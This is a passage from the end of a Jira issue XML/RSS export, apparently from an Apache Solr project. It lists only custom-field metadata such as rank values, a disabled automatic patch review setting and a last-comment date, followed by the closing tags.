                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            7 years, 26 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|i3tdv3:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12313321" key="com.atlassian.jira.toolkit:message">
                        <customfieldname>Solr Mailing List Info</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </customfields>
    </item>
</channel>
</rss>